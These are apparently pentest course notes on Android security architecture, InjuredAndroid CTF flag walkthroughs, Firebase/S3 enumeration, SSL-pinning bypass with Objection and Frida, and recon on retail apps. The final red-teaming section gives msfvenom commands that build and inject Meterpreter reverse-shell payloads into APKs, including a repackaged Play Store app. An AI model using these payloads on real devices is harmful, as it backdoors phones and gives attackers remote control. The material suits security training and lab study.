# Android

## Android Intro and Security Architecture

### Android Security Architecture

#### OS and Runtime

* Android is based on the  Linux Operating System
  * Your Android phone can take commands just like any Linux device
  * Permissions to folders and applications are dependent on the Linux Operating System file permissions model

Dalvik vs the Android Runtime

* Every application is run in a virtual machine known as the Android Runtime
  * Dalvik was the original runtime VM, and is still referenced to by the name Dalvik bytecode
    * Dalvik is not utilized in modern Android OS, and has been replaced by the ART
* Android Runtime (ART)
  * This is the modern translation layer from the application's bytecode to device instructions
  * Every app runs in its own sandboxed virtual machine
  * Likewise, in the file system applications are isolated by creating a new user unique for that application.

#### Android Identity and Access Management

* As mentioned, each application has its own user for the application
  * This user is the owner of the application directory (UID between 10000 and 999999, username similar: i.e. u0\_a188 for UID 10188)
    * /data/app/com.example.app - generic application data
    * /data/data/com.example.app - runtime storage of data
    * /mnt/sdcard/Android/data/com.example.app - externally stored location for runtime
    * /data/data/com.example2.app - a different app requiring different user
  * This stops applications from interacting with each other unless explicitly granted permissions, or a Content Provider/Broadcast Receiver is exposed
* Root user, system level accounts
  * Emulators with non-Google Play APIs allow root
* Profiles
  * Separated App Data, useful for things like BYOD
    * Work Profile, Personal Profile, Always-On VPN for certain apps
    * Still has access to system level functions such as Wi-Fi, Bluetooth, 4G LTE, but can have isolated aspects for Data Loss Prevention like a clipboard (copy-paste), contacts, camera, etc.
* Primary User - this is the user created first time the phone is started, always running, can only be removed by factory reset
* Secondary User - Additional users you can add to the device, and can be created/deleted by the primary user
* Guest User - can only be one guest user at a time, a fast way to have guest access to the phone
* Kid Mode - Google Kids Spaces (tablets only), Profiles/Account for Kids, usually vendor specific i.e. Samsung Kid Mode

### Android Architecture Layers

* Major Layers:
  * Linux Kernel
  * Hardware Abstraction Layer
  * Libraries (Native C or Android Runtime)
  * Java API Layer
  * System Apps

#### Linux Kernel

* Support for multiple CPU types (ARM, SoC) and 32 and 64 bit
* Applications are explicitly told which version of the Android Runtime/API version to run on
  * Android Manifest - minSDKVersion
  * The higher, the better, BUT developers want to include the most customers possible.
* Lower SDK/Android Versions can have more security vulnerabilities and can allow for different types of attacks on only some devices/emulators
* Access to the physical components of the Linux device are controlled by drivers
  * Bluetooth, Camera, Microphone, Wi-Fi, LTE, Display, etc.

#### Hardware Abstraction Layer (HAL)

* Abstraction layer that allows applications to access hardware components irrespective of the device manufacturer or type
  * Allows applications to simply access "the camera", "the microphone", "the location (GPS)", Bluetooth, the touch drivers without needing specific built-in drivers or manufacturer details
* New/Upcoming HAL Types
  * Automotive - Android Auto, Apple Car Play
  * IoT
    * Fitness Watches
    * Fitness Devices (Peloton, etc.)
    * IoT Home devices (Alexa, Google Home, etc.)
  * Gaming Peripherals

#### Native C vs Android Runtime

* C and C++ is the device's native language
  * Does not require a VM
  * Webkit - built in web browser for the app (iFrame)
  * OpenMAX AL, OpenGL ES - UI frameworks for 2D/3D models
* Java is often easier to code4 in, meaning that most developers prefer this
  * Older apps built in Java, newer ones often built in Kotlin
  * In 2019 Google announce Kotlin will be the preferred coding standard
  * Kotlin is utilized by approximately 60% of app developers for Android

#### Java API Framework

* This is often waht allows you app to interact with other apps, and also the device itself as defined in the Android app
* Content Providers - a way of sharing data to other applications via a specific directory (if exported)
  * content://\<app-URI>/directory
* View System - utilized for making the App's UI and normalizing it
* Managers
  * Manages and runs things like:
    * Notifications - app popups for reminders
    * Telephony - receicing/making calls, and opening contacts
    * Package - managing the application package, looking for updates, ensuring integrity
    * Location - manager of location services

#### System Application Layer

* The pre-installed applications on the Android Phone
  * Contacts, Phone, System Settings, Text Message Apps, Camera, System Monitor, Calendar
  * Google Applications
  * Vendor Specific Apps
  * Great thing about Android is you can always set a new default app to replace the vendor-supplied or system app

### Application Security and Signing

#### Android Application Security

* Every Android Application can be reverse-engineered, rebuilt, re-signed, and re-run
* This means an attack can modify application functionality
* The source code is available by using a tool like JADX-GUI or Apktool
* Developers: Java or Kotlin --> DEX Bytecode
* Reverse Engineers: DEX bytecode --> SMALI --> Decompiled Java

#### Compilation Process

* Normal Java Program
  * Java source code --> Java compiler --> Java bytecode --> Java VM
* Android Program (Replace Dalvik VM with ART)
  * Java source code --> Java compiler --> Java bytecode --> Dex compiler --> Dalvik bytecode --> Dalvik VM

#### Application Signing

Signing an app with Play App Signing:

* Developer (Upload key) --> App signed with upload key --> Google (App signing key) --> App signed with app signing key --> User
* Since anyone could modify an application and publish it to the Play Store, how do we ensure it's integrity?
* Answer: Public-key cryptography
  * Today there are three methods of verifying signatures:
    * APK Signature scheme v1, v2, and v3
    * In addition, Google implemented Google Play signing which adds unique signatures to the apps
    * keytool, jarsigner, zipalign

## Android Lab Setup

### Windows

JADX-GUI - [https://github.com/skylot/jadx](https://github.com/skylot/jadx)

adb - [https://developer.android.com/studio/releases/platform-tools](https://developer.android.com/studio/releases/platform-tools)

Apktool - [https://ibotpeaches.github.io/Apktool/install/](https://ibotpeaches.github.io/Apktool/install/)

Android Studio - [https://developer.android.com/studio](https://developer.android.com/studio)

### Kali

<pre class="language-bash"><code class="lang-bash"><strong>sudo apt install jadx
</strong><strong>sudo apt install adb
</strong>sudo apt install apktool
</code></pre>

Android Studio - [https://developer.android.com/studio](https://developer.android.com/studio)

### Emulator Setup & Recommendations

#### Standard Views

From Android Studio: View --> Tool Windows --> Device File Explorer & Terminal & Logcat

#### Start Android Emulator

Device Manager --> Create device --> Phone --> and a name i.e. Nexus

Have at least 2 or 3 emulators running to test

### Access ADB Shell from a VM/Networked Device

```bash
# Access an emulator from one host machine to another on the network (or a VM)
# Open port on host machine for another network device
adb -a nodaemon server
# If it is already running and cannot bind, use the below command
taskkill /f /t /im adb.exe
# From VM or other network device
adb -H <HOST IP> -P 5037 shell
```

### Additional Emulator Options

#### Tools

* [Genymotion](https://www.genymotion.com/)
* [Xamarin](https://dotnet.microsoft.com/apps/xamarin)
* [Visual Studio Emulator for Android](https://visualstudio.microsoft.com/vs/msft-android-emulator/)

### Physical Device Setup

* Enable Developer Options
  * Settings --> About phone --> click Build number about 9 times --> back a page and find Developer options --> Enable USB debugging --> and you should be able to plugin phone
* Suggestions
  * Use Stay awake feature so it will no sleep while charging

## Android Static Analysis

### Pulling an APK From the Google Play Store

> Need to have a Google account to access Play Store

From the Emulator select Play Store and search on "Injured Android"



From Android Studio Terminal:

```bash
adb devices  # Verify device to work on
adb shell  # Create shell on device to work on
pm list packages | grep -i injured  # Look for Injured Android app
pm path b3nac.injuredandroid  # Find path for specific package
exit
mkdir APKFolder
cd APKFolder
adb pull /data/app/b3nac.injuredandroid-<base64 string>/base.apk injuredAndroid_pull.apk

```

If the APK cannot be found in the Play Store it can be installed manually:

```bash
# First, download the APK from source location
# Then install APK to device:
adb -e install .\InjuredAndroid-1.0.12-release.apk
```

Then open the saved .apk file with jadx-gui

### Intro to Injured Android

[https://github.com/B3nac/InjuredAndroid](https://github.com/B3nac/InjuredAndroid)

### Enumerating AWS Storage Buckets via Static Analysis

[https://github.com/initstring/cloud\_enum](https://github.com/initstring/cloud\_enum)

> Example using Flag 8 which hints at AWS CLI

```bash
git clone https://github.com/initstring/cloud_enum.git
cd cloud_enum
pip3 install -r requirements.txt
python3 cloud_enum.py -k injuredandroid  # May not find anything
# Assuming we found an AWS S3 resource we can enumerate it with AWSCLI
aws configure --profile injuredandroid
# Enter in found AWS_ID and AWS_SECRET values in strings.xml
aws --profile injuredandroid s3 ls s3://injuredandroid
```

### Android Manifest.xml

[https://developer.android.com/guide/topics/manifest/manifest-intro](https://developer.android.com/guide/topics/manifest/manifest-intro)

APK --> Resources --> AndroidManifest.xml

* Where the basics of the application are defined
  * minSDKVersion
  * Permissions
  * Activities
  * Content Providers

Permissions

* Defines what data and hardware components the app needs access to:
  * Camera
  * Contacts
  * Internet
  * Read/Write External Storage
  * Package Management
  * Bluetooth
  * Etc.
* Full list:&#x20;
  * [https://developer.android.com/reference/android/Manifest.permission](https://developer.android.com/reference/android/Manifest.permission)

Activities

* Basically, UI elements or different "screens" in the application
  * Some activities need to be protected, i.e.:
    * Account Details
    * Money Transfer Screens
    * Hidden Screens
  * Often performed through intent-filters
  * An exported="True" activity can be access from outside the application

Content Providers

* Utilized to server data from your application to other applications
  * Sometimes used for sharing data between a bunch of related apps
  * If Content Providers are exported, this can be very dangerous and expose data to any user or app on the device

### Manual Static Analysis

> Using apktool

```bash
apktool d InjuredAndroid-1.0.12-release.apk  # Decompile the APK
```

### How to Find Hardcoded Strings

#### Common Application Strings

* Hardcoded Strings
  * Often hardcoded strings can be found in resources/strings.xml
  * Hardcoded strings can also be found in activity source code
  * Threat vector:
    * Login bypass (username/password, or client credentials)
    * URLs exposed (http/https)
    * API Keys exposed
    * Firebase URLs (firebase.io)

### Injured Android Static Analysis (Flags 1-4)

#### Flag 1

> Hint: The flag is right under your nose

* From Jadx open the b3nac.injuredandroid from Source code --> FlagOneLoginActivity
* Looking at the source code, part of the login process is comparing a specific string (the flag) to allows for login access. I.e., the flag is in the source code.

#### Flag 2

> Hint: Key words Activity and exported

* From Jadx open the AndroidManifest.xml file
  * Search on `exported="true"`
  * Copy the activity name. I.e., b3nac.injuredandroid.b25lActivity
* From Android Studio, log into the phone using `adb shell`
  * Start the copied activity: `am start b3nac.injuredandroid/.b25lActivity`
  * The activity should pop up on the emulated phone screen showing the flag

#### Flag 3

> Hint: R stands for resources; Check .xml files

* From the FlagThreeActivity file in the submitFlag method, we copy the getString(r.string.cmVzb3VyY2VzX3lv) value.
  * Should be able to find cmVzb3VyY2VzX3lv in a XML file under resources.
* From resources.arsc --> res --> values --> strings.xml search on cmVzb3VyY2VzX3lv
  * And the found value for the cmVzb3VyY2VzX3lv variable shows the flag

#### Flag 4

> Hint: Where is bob; Classes and imports

* From the FlagFourActivity file in the submitFlag method, there is still a string comparison happening, where a new byte object C1461g is being created.
* Can use the Text search feature to search on C1461g
  * The same file is mentioned but so is another file
* In the other file there is a class where a string is being base64 encoded
* Decoding this string shows the flag

### Enumerating Firebase Databases via Static Analysis

[https://github.com/Sambal0x/firebaseEnum](https://github.com/Sambal0x/firebaseEnum)

Example:

* Copying that value and use firebaseEnum
  * `python3 firebaseEnum.py -k injuredandroid`

#### Flag 9

> Hint: Use the .json trick with database url; Filenames

* From the FlagNineFirebaseActivity there is another base64 decode call
  * Decoding the found strings shows a directory of flag/
* From the strings.xml file there is a firebase\_database\_url value
  * Navigating to that URL shows access denied
* Appending the /flags/ path to the firebase\_database\_url shows project does not exist or permissions are invalid
* Using the .json trick, by appending /.json to the URL, the flag is shown
  * https://injuredandroid.firebaseio.com/flags/.json

### Automated Analysis using MobSF

> Overview of the MobSF tool using the injuredandroid.apk file.

## Android Dynamic Analysis

### Intro to SSL Pinning/Dynamic Analysis

About SSL Pinning

* SSL Pinning is a security methodology utilized to ensure that application traffic is not being intercepted (Man-In-The-Middle)
  * Some mobile applications VERIFY that the received traffic is coming from a KNOWN certificate
  * We can import a certificate into the phone as a root or user certificate, but it STILL might not be trusted by the application
  * This can cause our application to crash when we try to intercept the network traffic
* From a pentester perspective, this can make our job a bit harder. We want to see live application traffic, see parameters passed and edit them if possible.

A Tale of Two Proxies

* Burp Suite
  * Proxy too with a lot of built-in penetration testing tools
  * Can be used for iOS and Android
  * Will be our last resort in iOS with a jailbroken device (Burp Mobile Assistant)
* Proxyman
  * Newer tool that works only on MacOS, but it has the ability to easily import it's certificate into the Mac Keychain and intercept application traffic
  * Can be used for iOS and Android
* Other options mitmproxy, charles proxy, fiddler, etc.

Android Interception Process

1. Start proxy software (burp Suite or Proxyman)
2. Configure Proxy Software
3. Set proxy of the emulator (or wifi settings for a physical device)
4. Intercept HTTP traffic
5. Import CA certificate
6. Trust CA Certificate in Android Certificate Store
7. Intercept HTTPS Traffic = Profit?! (or be shamed by SSL Pinning)
8. If shamed by SSL Pinning, try Objection/Frida

### Dynamic Analysis Using MobSF

[https://mobsf.github.io/docs/#/dynamic\_analyzer?id=android-studio-emulator](https://mobsf.github.io/docs/#/dynamic\_analyzer?id=android-studio-emulator)

<pre class="language-bash"><code class="lang-bash"># List available Android Virtual Devices (AVD)
emulator -list-avds  
# Run Android Virtual Device (AVD)
emulator -avd Pixel_6_Pro_API_33 -writable-system -no-snapshot
# Start MobSF (http://localhost:8000)
<strong>Mobile-Security-Framework-MobSF>run.bat
</strong></code></pre>

From MobSF, upload & analyze a package

### Burp Suite Setup/Intercept

* In Burp Suite, from the Proxy --> Options tab, set address to All interface and set a port.
* From emulator, select the ellipsis --> Settings --> Proxy --> Manual proxy configuration and enter in 127.0.0.1 and the port configured in Burp Suite.
* Navigate to a website from the browser on the Android phone and we'll see a security certificate error.
  * Select View Certificate and you'll see is it the PortSwigger CA (from Burp Suite)
* To trust the certificate it needs to be imported into the phone
  * From Burp Suite, from the Proxy --> Options tab, select the Import/export CA certificate --> select Certificate in DER format --> Next --> Select file --> and save as \<NAME>.CER (adding the CER extension) --> Save --> Next, and now the certificate is on the machine.
    * Can just drag and drop the .CER file to the phone
  * From the emulator, select Settings --> select/search on Security --> and figure out how to import the certificate.

### Patching Applications Automatically Using Objection

[https://github.com/sensepost/objection](https://github.com/sensepost/objection)

```bash
pip3 install frida-tools
> frida
pip3 install objection
> objection
```

Path the APK file

```bash
objection patchapk --source injuredAndroid_pulled.apk
# Will create a new objection.apk file
# Delete the existing injuredAndroid application from the emulator
# Drag and drop the new apk file into the emulator to install
# May get a Failure for no certificates...may need to do manual patching
```

### Patching Applications Manually

[https://frida.re/docs/android/](https://frida.re/docs/android/), [https://github.com/frida/frida](https://github.com/frida/frida)

[https://koz.io/using-frida-on-android-without-root/](https://koz.io/using-frida-on-android-without-root/)

Process to Follow:

* Decompile Source Code: `apkool d -r <target.apk>`
* Download frida-gadget for your CPU Architecture from GitHub releases
* Unzip File, and rename file to frida-gadget.so
* Inject Frida-gadget into Android App under: /lib/\<CPUArch-For-Your-Device>
* Save As: libfrida-gadget.so
* Add reference to frida-gadget to SMALI code, in a known exported activity or otherwise accessible Activity (usually MainActivity.smali, or OnboardingActivity.smali): const-string v0, "frida-gadget" invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
* Recompile Application: `apktool b <target.apk> -o <output_file.apk>` (in this case target.apk points to the folder you decompiled in step #1)
* Sign with your key, and zipalign the app

### Dynamic Analysis - Final Notes and Vectors

Other Objection commands to look into:

```bash
android clipboard monitor
memory dump all
android heap
sqlite connect
android hook
android intent
android keystore list
android root simulate
android sslpinning disable
```

### The Frida Codeshare

[https://codeshare.frida.re/](https://codeshare.frida.re/)

### Using Frida Codeshare & Startup Scripts

Recommended Frida Code Share Scripts:

* Universal SSL Pinning Bypass: [https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/](https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/)
* Frida Antiroot: [https://codeshare.frida.re/@dzonerzy/fridantiroot/](https://codeshare.frida.re/@dzonerzy/fridantiroot/)

### Common Issues: Can't Decode Resources

Common issue thread on GitHub: [https://github.com/iBotPeaches/Apktool/issues/1776](https://github.com/iBotPeaches/Apktool/issues/1776)

## Android Bug Bounty Hunt

### Joann Fabrics

1. From Android Studio Emulator select the Play Store and Install the application
2. Start adb shell: `adb shell`
   1. `pm list packages | grep joann`
   2. `pm path com.fifthfinger.clients.joann`
      1. Copy the path from the output
   3. `exit`
3. `adb pull <PATH FROM THE OUTPUT> joann.apk`
4. Open up the APK file in jadx-gui
   1. AndroidManifest.xml
      1. Search on interesting information
      2. Look for APIs and API keys
   2. common.properties
   3. strings.xml
   4. Other XML files and the Text search magnifying glass
5. Intercept interactions with the app with Burp Suite
   1. If getting SSL errors, use objection like below
6. Try to patch the application with Objection
   1. `objection patchapk --source joann.apk`
   2. Uninstall application from Android emulator
   3. Install new joann APK file (joann.objection.apk) onto the Android emulator
      1. `adb install joann.objection.apk`
7. If Objection doesn't work, the manual application patching will have to be done
8. Then use Objection again
   1. `objection explore`
   2. `android sslpinning disable`
      1. And now we should be able to intercept traffic with Burp Suite

### Sam's Club App

1. From Android Studio Emulator select the Play Store and Install the application
2. Start adb shell: `adb shell`
   1. `pm list packages | grep sams`
   2. `pm path com.rfi.sams.android`
      1. Copy the path from the output
   3. `exit`
3. `adb pull <PATH FROM THE OUTPUT>`
4. Open up the APK file in jadx-gui
   1. AndroidManifest.xml
   2. common.properties
   3. strings.xml
5. Intercept interactions with the app with Burp Suite

## BONUS - Android Red Teaming

### In-Line Attacks

Hak5 O.M.G Cable: [https://shop.hak5.org/products/o-mg-cable-usb-a](https://shop.hak5.org/products/o-mg-cable-usb-a)

Hacker Warehouse: [https://hackerwarehouse.com/product/usb-ninja-cable/](https://hackerwarehouse.com/product/usb-ninja-cable/)

### Creating a Generic APK with Metasploit Shell

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<> LPORT=<> R> android.apk
# Application signing process
keytool -genkey -V -keystore key.keystore -alias keystore -keyalg RSA -keysize 2048 -validity 10000
# Sign the jar
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk keystore
# Zip Align
zipalign -v 4 android.apk hackedapp.apk
```

<pre class="language-bash"><code class="lang-bash"><strong># Install the malicious APK file
</strong><strong>adb H &#x3C;IP> -P 5037 install hackedapp.apk
</strong># Start a meterpreter listener
msf5 exploit(multi/handler) > run
# Run malicious APK file from the emulator
</code></pre>

### Injecting Play Store App with Metasploit Shell

```bash
adb -H <IP> -P 5037 shell
pm list packages | grep injured
# Copy package name output
pm path <Package name output>
# Copy the of this output
exit
adb -H <IP> -P 5037 pull <Path output> injured.apk
msfvenom -x injured.apk -p android/meterpreter/reverse_tcp LHOST=<> LPORT=<> -o InjuredMSF.apk
# Uninstall old app from emulator
# Install new malicious app to emulator
adb -H <IP> -P 5037 install InjuredMSF.apk
# Start a meterpreter listener
msf5 exploit(multi/handler) > run
# Run malicous app from the emulator
```

If you are interested in exploiting an app manually I highly suggest following this article from Black Hills Infosec: [https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)

### The Ghost Framework

[https://github.com/kp-forks/ghost-1](https://github.com/kp-forks/ghost-1)

Extra Video from HackerLoi showing him using Ghost Framework on a Android Phone:[ https://www.youtube.com/watch?v=0eAafqElwik](https://www.youtube.com/watch?v=0eAafqElwik)
